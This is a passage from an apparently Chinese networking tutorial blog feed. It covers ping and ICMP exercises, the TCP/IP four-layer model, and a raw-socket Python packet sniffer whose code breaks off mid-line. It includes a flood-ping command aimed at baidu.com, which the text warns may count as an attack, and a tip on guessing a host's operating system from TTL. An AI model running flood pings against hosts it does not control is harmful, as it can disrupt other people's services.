ping用于测试网络连通性和延迟</li><li>✅ ping基于ICMP协议（类型8请求，类型0回复）</li><li>✅ RTT是数据包往返的总时间</li><li>✅ TTL表示数据包还能经过多少个路由器</li><li>✅ 实现ping需要使用原始套接字</li></ol><h3 id="重要概念">重要概念</h3><table><thead><tr><th>概念</th><th>含义</th><th>单位</th></tr></thead><tbody><tr><td>RTT</td><td>往返时间</td><td>毫秒(ms)</td></tr><tr><td>TTL</td><td>生存时间</td><td>跳数(hops)</td></tr><tr><td>丢包率</td><td>丢失的包占总数的比例</td><td>百分比(%)</td></tr><tr><td>ICMP</td><td>网络控制消息协议</td><td>-</td></tr></tbody></table><h3 id="ping命令速查">ping命令速查</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 基本用法</span><br>ping 目标主机<br><br><span class="hljs-comment"># 常用选项</span><br>-c 次数      <span class="hljs-comment"># Linux/Mac: 指定ping次数</span><br>-n 次数      <span class="hljs-comment"># Windows: 指定ping次数</span><br>-i 间隔      <span class="hljs-comment"># 指定发送间隔（秒）</span><br>-s 大小      <span class="hljs-comment"># 指定数据包大小</span><br>-t           <span class="hljs-comment"># Windows: 持续ping</span><br></code></pre></td></tr></table></figure><h2 id="💪-练习题">💪 练习题</h2><h3 id="练习1：实际操作">练习1：实际操作</h3><p>使用ping命令测试以下主机，记录RTT和TTL：</p><ol><li><a href="http://baidu.com">baidu.com</a></li><li><a href="http://google.com">google.com</a></li><li>你的路由器（通常是192.168.1.1）</li><li>本机（127.0.0.1）</li></ol><h3 id="练习2：理解TTL">练习2：理解TTL</h3><p>如果ping baidu.com的TTL是52，初始TTL是64，问：</p><ol><li>数据包经过了多少个路由器？</li><li>为什么不同的主机TTL不一样？</li></ol><h3 id="练习3：分析丢包">练习3：分析丢包</h3><p>如果ping一个网站，出现以下情况，可能的原因是什么？</p><ol><li>100%丢包</li><li>偶尔丢包（10-20%）</li><li>RTT很高（&gt;500ms）</li></ol><h3 id="练习4：代码扩展">练习4：代码扩展</h3><p>扩展ping工具：</p><ol><li>添加图形化的RTT变化显示</li><li>支持ping多个主机</li><li>将结果保存到文件</li><li>添加声音提示（连通时播放提示音）</li></ol><h3 id="练习5：思考题">练习5：思考题</h3><ol><li>为什么ping使用ICMP而不是TCP或UDP？</li><li>能否通过ping判断对方的操作系统？（提示：看TTL初始值）</li><li>防火墙可以阻止ping吗？</li></ol><h2 id="📚-扩展阅读">📚 扩展阅读</h2><h3 id="ping的高级用法">ping的高级用法</h3><p><strong>测试MTU（最大传输单元）</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Linux/Mac</span><br>ping -M <span class="hljs-keyword">do</span> -s 1472 baidu.com<br><br><span class="hljs-comment"># Windows</span><br>ping -f -l 1472 baidu.com<br><br><span class="hljs-comment"># 如果成功，说明MTU &gt;= 1500</span><br><span class="hljs-comment"># 如果失败，逐渐减小数值直到成功</span><br></code></pre></td></tr></table></figure><p><strong>洪水ping（压力测试）</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Linux（需要root权限）</span><br><span class="hljs-built_in">sudo</span> ping -f baidu.com<br><br><span class="hljs-comment"># 说明：尽可能快地发送包，用于压力测试</span><br><span class="hljs-comment"># ⚠️ 注意：不要对公共服务器使用，可能被视为攻击</span><br></code></pre></td></tr></table></figure><h3 id="不同操作系统的TTL初始值">不同操作系统的TTL初始值</h3><table><thead><tr><th>操作系统</th><th>TTL初始值</th></tr></thead><tbody><tr><td>Linux</td><td>64</td></tr><tr><td>Windows</td><td>128</td></tr><tr><td>Cisco路由器</td><td>255</td></tr><tr><td>Unix/BSD</td><td>255</td></tr></tbody></table><p>通过ping返回的TTL，可以大致判断对方的操作系统类型！</p><h3 id="ICMP的其他用途">ICMP的其他用途</h3><ol><li><strong>Traceroute</strong>：通过逐步增加TTL来追踪路由</li><li><strong>MTU发现</strong>：确定最佳数据包大小</li><li><strong>网络诊断</strong>：检测网络配置问题</li><li><strong>错误报告</strong>：通知源主机网络错误</li></ol><h2 id="🎯-明天预告">🎯 明天预告</h2><p><strong>第6天：网络命令进阶 - traceroute</strong></p><p>我们将学习：</p><ul><li>traceroute的工作原理</li><li>如何追踪数据包的完整路径</li><li>理解TTL在路由追踪中的作用</li><li>编写自己的traceroute工具</li></ul><hr><p>💡 <strong>今日金句</strong>：ping通网络，就像听到远方朋友的回音！</p><p>👉 <a href="day04.md">上一天：TCP/IP四层模型</a> | <a href="../../README.md">返回目录</a> | <a href="day06.md">下一天：traceroute详解</a></p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>4天：TCP/IP四层模型</title>
    <link href="/2025/11/10/4%E5%A4%A9%EF%BC%9ATCP_IP%E5%9B%9B%E5%B1%82%E6%A8%A1%E5%9E%8B/"/>
    <url>/2025/11/10/4%E5%A4%A9%EF%BC%9ATCP_IP%E5%9B%9B%E5%B1%82%E6%A8%A1%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h1>第4天：TCP/IP四层模型</h1><blockquote><p>“理论是OSI，实战是TCP/IP。”</p></blockquote><h2 id="📚-今日目标">📚 今日目标</h2><ul><li>理解TCP/IP四层模型</li><li>掌握TCP/IP与OSI的区别和联系</li><li>学会分析真实的网络数据包</li><li>编写程序捕获和解析数据包</li></ul><h2 id="🎯-为什么需要TCP-IP模型？">🎯 为什么需要TCP/IP模型？</h2><h3 id="OSI-vs-TCP-IP">OSI vs TCP/IP</h3><p><strong>OSI七层模型</strong>：</p><ul><li>📖 理论模型，由ISO制定</li><li>🎓 教学用途，帮助理解网络概念</li><li>📚 过于复杂，实际应用较少</li></ul><p><strong>TCP/IP四层模型</strong>：</p><ul><li>💻 实际使用的模型</li><li>🌐 互联网的基础</li><li>🚀 简单实用，广泛应用</li></ul><h3 id="类比理解">类比理解</h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">OSI模型 <span class="hljs-operator">=</span> 理想的建筑设计图纸（<span class="hljs-number">7</span>层楼）<br>TCP/IP模型 <span class="hljs-operator">=</span> 实际建造的房子（<span class="hljs-number">4</span>层楼，但功能齐全）<br></code></pre></td></tr></table></figure><h2 id="📊-TCP-IP四层模型">📊 TCP/IP四层模型</h2><h3 id="层次对应关系">层次对应关系</h3><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs livescript">┌──────────────────┐<br>│   OSI七层模型    │            TCP/IP四层模型<br>├──────────────────┤<br>│  <span class="hljs-number">7.</span> 应用层       │ <span class="hljs-string">\</span><br>│  <span class="hljs-number">6.</span> 表示层       │  <span class="hljs-string">\</span>       ┌──────────────────┐<br>│  <span class="hljs-number">5.</span> 会话层       │   &#125; ───&gt; │  <span class="hljs-number">4.</span> 应用层       │<br>└──────────────────┘  /       │  (Application)   │<br>┌──────────────────┐ /        └──────────────────┘<br>│  <span class="hljs-number">4.</span> 传输层       │ ───────&gt; ┌──────────────────┐<br>└──────────────────┘          │  <span class="hljs-number">3.</span> 传输层       │<br>┌──────────────────┐          │  (Transport)     │<br>│  <span class="hljs-number">3.</span> 网络层       │ ───────&gt; └──────────────────┘<br>└──────────────────┘          ┌──────────────────┐<br>┌──────────────────┐          │  <span class="hljs-number">2.</span> 网际层       │<br>│  <span class="hljs-number">2.</span> 数据链路层   │ <span class="hljs-string">\</span>        │  (Internet)      │<br>│  <span class="hljs-number">1.</span> 物理层       │  &#125; ───&gt;  └──────────────────┘<br>└──────────────────┘ /        ┌──────────────────┐<br>                               │  <span class="hljs-number">1.</span> 网络接口层   │<br>                               │  (Network Access)│<br>                               └──────────────────┘<br></code></pre></td></tr></table></figure><h3 id="TCP-IP各层详解">TCP/IP各层详解</h3><h4 id="第4层：应用层（Application-Layer）">第4层：应用层（Application Layer）</h4><p><strong>对应OSI</strong>：应用层 + 表示层 + 会话层</p><p><strong>主要协议</strong>：</p><ul><li>🌐 HTTP/HTTPS：网页浏览</li><li>📧 SMTP/POP3/IMAP：邮件</li><li>📁 FTP：文件传输</li><li>🔍 DNS：域名解析</li><li>🔐 SSH：远程登录</li><li>💬 MQTT：物联网通信</li></ul><p><strong>作用</strong>：为用户提供各种网络服务</p><p><strong>例子</strong>：</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nix">浏览器访问 www.baidu.com<br>↓<br>应用层：生成HTTP请求<br>GET <span class="hljs-symbol">/</span> HTTP<span class="hljs-symbol">/1.1</span><br><span class="hljs-params">Host:</span> www.baidu.com<br></code></pre></td></tr></table></figure><hr><h4 id="第3层：传输层（Transport-Layer）">第3层：传输层（Transport Layer）</h4><p><strong>对应OSI</strong>：传输层</p><p><strong>主要协议</strong>：</p><ul><li>🚚 TCP：可靠传输，面向连接</li><li>📦 UDP：快速传输，无连接</li></ul><p><strong>作用</strong>：提供端到端的数据传输</p><p><strong>关键概念</strong>：</p><ul><li><strong>端口号</strong>：标识应用程序<ul><li>HTTP: 80</li><li>HTTPS: 443</li><li>SSH: 22</li><li>MySQL: 3306</li></ul></li></ul><p><strong>TCP vs UDP</strong>：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">TCP</span> <span class="hljs-operator">=</span> 打电话（需要接通，可靠）<br><span class="hljs-attribute">UDP</span> <span class="hljs-operator">=</span> 发短信（直接发，不保证送达）<br></code></pre></td></tr></table></figure><hr><h4 id="第2层：网际层（Internet-Layer）">第2层：网际层（Internet Layer）</h4><p><strong>对应OSI</strong>：网络层</p><p><strong>主要协议</strong>：</p><ul><li>🌐 IP：网际协议（IPv4/IPv6）</li><li>📡 ICMP：控制消息协议</li><li>🗺️ ARP：地址解析协议</li><li>🔀 IGMP：组管理协议</li></ul><p><strong>作用</strong>：路由和寻址，在网络间传输数据</p><p><strong>关键概念</strong>：</p><ul><li><strong>IP地址</strong>：设备的网络地址<ul><li>192.168.1.100（私网）</li><li>8.8.8.8（公网）</li></ul></li></ul><p><strong>例子</strong>：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">从北京的电脑访问上海的服务器<br>↓<br>网际层：选择最佳路径<br>北京 → 路由器1 → 路由器2 → <span class="hljs-string">...</span> → 上海<br></code></pre></td></tr></table></figure><hr><h4 id="第1层：网络接口层（Network-Access-Layer）">第1层：网络接口层（Network Access Layer）</h4><p><strong>对应OSI</strong>：数据链路层 + 物理层</p><p><strong>主要协议</strong>：</p><ul><li>🔗 Ethernet：以太网</li><li>📶 WiFi：无线局域网</li><li>🔌 PPP：点对点协议</li></ul><p><strong>作用</strong>：在物理网络上传输数据帧</p><p><strong>关键概念</strong>：</p><ul><li><strong>MAC地址</strong>：网卡的物理地址<ul><li>AA:BB:CC:DD:EE:FF</li></ul></li></ul><p><strong>例子</strong>：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css">同一个局域网内的两台电脑通信<br>↓<br>网络接口层：通过MAC地址直接传输<br>电脑<span class="hljs-selector-tag">A</span>的网卡 → 交换机 → 电脑<span class="hljs-selector-tag">B</span>的网卡<br></code></pre></td></tr></table></figure><h2 id="📦-TCP-IP数据封装">📦 TCP/IP数据封装</h2><h3 id="发送数据的封装过程">发送数据的封装过程</h3><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs coq">应用层：<br>[HTTP请求数据]<br>    ↓<br>传输层：<br>[TCP头部 | <span class="hljs-type">HTTP</span>请求数据]  ← Segment（段）<br>    ↓<br>网际层：<br>[IP头部 | <span class="hljs-type">TCP</span>头部 | <span class="hljs-type">HTTP</span>请求数据]  ← Packet（包）<br>    ↓<br>网络接口层：<br>[以太网帧头 | <span class="hljs-type">IP</span>头部 | <span class="hljs-type">TCP</span>头部 | <span class="hljs-type">HTTP</span>请求数据 | <span class="hljs-type">帧尾]  ← Frame</span>（帧）<br>    ↓<br>物理层：<br><span class="hljs-number">01010101.</span>..  ← Bits（比特流）<br></code></pre></td></tr></table></figure><h3 id="各层添加的信息">各层添加的信息</h3><table><thead><tr><th>层次</th><th>添加的信息</th><th>目的</th></tr></thead><tbody><tr><td>应用层</td><td>应用数据</td><td>用户数据</td></tr><tr><td>传输层</td><td>源端口、目标端口</td><td>标识应用程序</td></tr><tr><td>网际层</td><td>源IP、目标IP</td><td>标识主机位置</td></tr><tr><td>网络接口层</td><td>源MAC、目标MAC</td><td>标识网卡</td></tr></tbody></table><h2 id="🔧-实战项目：数据包分析器">🔧 实战项目：数据包分析器</h2><p>让我们编写一个程序，捕获和分析真实的网络数据包！</p><h3 id="代码实现">代码实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># day04_packet_analyzer.py</span><br><span class="hljs-comment"># 功能：捕获并分析网络数据包（TCP/IP各层信息）</span><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> textwrap<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ethernet_frame</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    解析以太网帧（网络接口层）</span><br><span class="hljs-string"></span><br><span class="hljs-string">    以太网帧格式：</span><br><span class="hljs-string">    [目标MAC(6字节) | 源MAC(6字节) | 类型(2字节) | 数据 | CRC(4字节)]</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 提取MAC地址和类型</span><br>    dest_mac, src_mac, eth_type = struct.unpack(<span class="hljs-string">&#x27;! 6s 6s H&#x27;</span>, data[:<span class="hljs-number">14</span>])<br><br>    <span class="hljs-comment"># 格式化MAC地址</span><br>    dest_mac = <span class="hljs-string">&#x27;:&#x27;</span>.join(<span class="hljs-string">&#x27;&#123;:02x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(b) <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> dest_mac)<br>    src_mac = <span class="hljs-string">&#x27;:&#x27;</span>.join(<span class="hljs-string">&#x27;&#123;:02x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(b) <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> src_mac)<br><br>    <span class="hljs-comment"># 以太网类型</span><br>    <span class="hljs-comment"># 0x0800 = IPv4, 0x86DD = IPv6, 0x0806 = ARP</span><br>    eth_type = socket.htons(eth_type)<br><br>    <span class="hljs-comment"># 返回MAC地址、类型和剩余数据</span><br>    <span class="hljs-keyword">return</span> dest_mac, src_mac, eth_type, data[<span class="hljs-number">14</span>:]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ipv4_packet</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    解析IPv4数据包（网际层）</span><br><span class="hljs-string"></span><br><span class="hljs-string">    IPv4头部格式（20字节）：</span><br><span class="hljs-string">    [版本+头长(1) | 服务类型(1) | 总长度(2) | 标识(2) | 标志+偏移(2) |</span><br><span class="hljs-string">     TTL(1) | 协议(1) | 校验和(2) | 源IP(4) | 目标IP(4)]</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 解析IPv4头部的前20字节</span><br>    version_header_length = data[<span class="hljs-number">0</span>]<br>    version = version_header_length &gt;&gt; <span class="hljs-number">4</span>  <span class="hljs-comment"># 高4位是版本</span><br>    header_length = (version_header_length &amp; <span class="hljs-number">15</span>) * <span class="hljs-number">4</span>  <span class="hljs-comment"># 低4位是头长（单位：4字节）</span><br><br>    <span class="hljs-comment"># 提取TTL、协议、源IP、目标IP</span><br>    ttl, proto, src, target = struct.unpack(<span class="hljs-string">&#x27;! 8x B B 2x 4s 4s&#x27;</span>, data[:<span class="hljs-number">20</span>])<br><br>    <span class="hljs-comment"># 格式化IP地址</span><br>    src_ip = <span class="hljs-string">&#x27;.&#x27;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">str</span>, src))<br>    target_ip = <span class="hljs-string">&#x27;.&#x27;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">str</span>, target))<br><br>    <span class="hljs-comment"># 协议号对应的协议名</span><br>    protocols = &#123;<span class="hljs-number">1</span>: <span class="hljs-string">&#x27;ICMP&#x27;</span>, <span class="hljs-number">6</span>: <span class="hljs-string">&#x27;TCP&#x27;</span>, <span class="hljs-number">17</span>: <span class="hljs-string">&#x27;UDP&#x27;</span>&#125;<br>    proto_name = protocols.get(proto, <span class="hljs-string">f&#x27;Other(<span class="hljs-subst">&#123;proto&#125;</span>)&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> version, header_length, ttl, proto_name, src_ip, target_ip, data[header_length:]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tcp_segment</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    解析TCP段（传输层）</span><br><span class="hljs-string"></span><br><span class="hljs-string">    TCP头部格式（至少20字节）：</span><br><span class="hljs-string">    [源端口(2) | 目标端口(2) | 序号(4) | 确认号(4) |</span><br><span class="hljs-string">     头长+标志(2) | 窗口(2) | 校验和(2) | 紧急指针(2)]</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    src_port, dest_port, sequence, acknowledgment, offset_reserved_flags = struct.unpack(<br>        <span class="hljs-string">&#x27;! H H L L H&#x27;</span>, data[:<span class="hljs-number">14</span>]<br>    )<br><br>    <span class="hljs-comment"># 提取头部长度（高4位）</span><br>    offset = (offset_reserved_flags &gt;&gt; <span class="hljs-number">12</span>) * <span class="hljs-number">4</span><br><br>    <span class="hljs-comment"># 提取TCP标志位</span><br>    flag_urg = (offset_reserved_flags &amp; <span class="hljs-number">32</span>) &gt;&gt; <span class="hljs-number">5</span><br>    flag_ack = (offset_reserved_flags &amp; <span class="hljs-number">16</span>) &gt;&gt; <span class="hljs-number">4</span><br>    flag_psh = (offset_reserved_flags &amp; <span class="hljs-number">8</span>) &gt;&gt; <span class="hljs-number">3</span><br>    flag_rst = (offset_reserved_flags &amp; <span class="hljs-number">4</span>) &gt;&gt; <span class="hljs-number">2</span><br>    flag_syn = (offset_reserved_flags &amp; <span class="hljs-number">2</span>) &gt;&gt; <span class="hljs-number">1</span><br>    flag_fin = offset_reserved_flags &amp; <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">return</span> src_port, dest_port, sequence, acknowledgment, flag_urg, flag_ack, \<br>           flag_psh, flag_rst, flag_syn, flag_fin, data[offset:]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">udp_segment</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    解析UDP段（传输层）</span><br><span class="hljs-string"></span><br><span class="hljs-string">    UDP头部格式（8字节）：</span><br><span class="hljs-string">    [源端口(2) | 目标端口(2) | 长度(2) | 校验和(2)]</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    src_port, dest_port, length = struct.unpack(<span class="hljs-string">&#x27;! H H 2x H&#x27;</span>, data[:<span class="hljs-number">8</span>])<br>    <span class="hljs-keyword">return</span> src_port, dest_port, length, data[<span class="hljs-number">8</span>:]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">format_multi_line</span>(<span class="hljs-params">prefix, string, size=<span class="hljs-number">80</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;格式化多行输出&quot;&quot;&quot;</span><br>    size -= <span class="hljs-built_in">len</span>(prefix)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(string, <span class="hljs-built_in">bytes</span>):<br>        string = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-string">r&#x27;\x&#123;:02x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(byte) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> string)<br>        <span class="hljs-keyword">if</span> size % <span class="hljs-number">2</span>:<br>            size -= <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;\n&#x27;</span>.join([prefix + line <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> textwrap.wrap(string, size)])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    主函数：捕获并分析数据包</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">80</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;TCP/IP数据包分析器&quot;</span>.center(<span class="hljs-number">80</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">80</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n📡 正在监听网络接口...&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;💡 提示：访问一个网站或ping一个地址来生成流量&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;⚠️  按Ctrl+C停止捕获\n&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">80</span>)<br><br>    <span class="hljs-comment"># 创建原始套接字</span><br>    <span class="hljs-comment"># 注意：在某些系统上可能需要root权限</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># Windows</span><br>        conn = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)<br>        conn.bind((<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-number">0</span>))<br>        conn.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, <span class="hljs-number">1</span>)<br>        conn.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)<br>    <span class="hljs-keyword">except</span> AttributeError:<br>        <span class="hljs-comment"># Linux/Mac</span><br>        conn = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(<span class="hljs-number">3</span>))<br><br>    packet_count = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            <span class="hljs-comment"># 接收数据</span><br>            raw_data, addr = conn.recvfrom(<span 